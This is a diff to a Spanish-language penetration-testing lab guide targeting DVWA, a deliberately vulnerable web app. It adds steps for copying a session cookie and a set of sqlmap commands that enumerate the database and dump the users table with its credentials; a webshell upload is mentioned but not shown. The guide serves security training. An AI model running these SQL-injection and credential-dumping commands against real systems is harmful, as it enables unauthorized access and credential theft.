@@ -422,23 +422,55 @@ uid=0(root) gid=0(root)
 
 **Descripción**: DVWA (Damn Vulnerable Web Application) expone múltiples vulnerabilidades web. Utilizaremos SQLi para extraer credenciales y File Upload para subir una webshell.
 
-**Pre-requisito**: Abrir `http://192.168.56.102/dvwa/` en el navegador, iniciar sesión con `admin/password`, ajustar el nivel de seguridad a "Low".
+**Pre-requisito**: Abrir `http://$TARGET/dvwa/` en el navegador, iniciar sesión con `admin/password`, ajustar el nivel de seguridad a "Low".
+
+#### Paso 1: Identificar tu sesión de DVWA
+
+**Tu tarea**: Inicia sesión en DVWA y obtén tu cookie de sesión.
+
+**Pasos:**
+1. Abre `http://$TARGET/dvwa/` en el navegador
+2. Inicia sesión con `admin/password`
+3. Abre las herramientas de desarrollador del navegador (F12)
+4. Ve a la pestaña de Application > Cookies
+5. Copia el valor de la cookie `PHPSESSID`
+6. Nota: También necesitarás la cookie `security` establecida en `low`
 
 ```bash
-# 4a. Extracción de credenciales con SQLmap
-sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
-       --cookie="security=low; PHPSESSID=<tu_session_id>" \
-       --dbs --batch
+# Guardar tus cookies para usar en sqlmap (reemplazar con tus valores reales)
+export PHPSESSID="tu_valor_de_cookie_aqui"
+export SECURITY_COOKIE="low"
+```
 
-# Ver tablas de la base de datos dvwa
-sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
-       --cookie="security=low; PHPSESSID=<tu_session_id>" \
-       -D dvwa --tables --batch
+#### Paso 2: Extracción de credenciales con SQLmap
 
-# Volcar tabla de usuarios
+**Tu tarea**: Ejecutar los siguientes comandos para extraer información de la base de datos.
+
+```bash
+# 4a. Listar todas las bases de datos
 sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
-       --cookie="security=low; PHPSESSID=<tu_session_id>" \
-       -D dvwa -T users --dump --batch
+        --cookie="security=low; PHPSESSID=$PHPSESSID" \
+        --dbs --batch
+
+# 4b. Ver tablas de la base de datos dvwa
+sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+        --cookie="security=low; PHPSESSID=$PHPSESSID" \
+        -D dvwa --tables --batch
+
+# 4c. Ver columnas de la tabla de usuarios
+sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+        --cookie="security=low; PHPSESSID=$PHPSESSID" \
+        -D dvwa -T users --columns --batch
+
+# 4d. Volcar tabla de usuarios
+sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+        --cookie="security=low; PHPSESSID=$PHPSESSID" \
+        -D dvwa -T users --dump --batch
+
+# 4e. Extraer credenciales específicas (alternativa más rápida)
+sqlmap -u "http://$TARGET/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+        --cookie="security=low; PHPSESSID=$PHPSESSID" \
+        -D dvwa -T users -C user_id,user,password --dump --batch
 ```
 
 **Output esperado**:
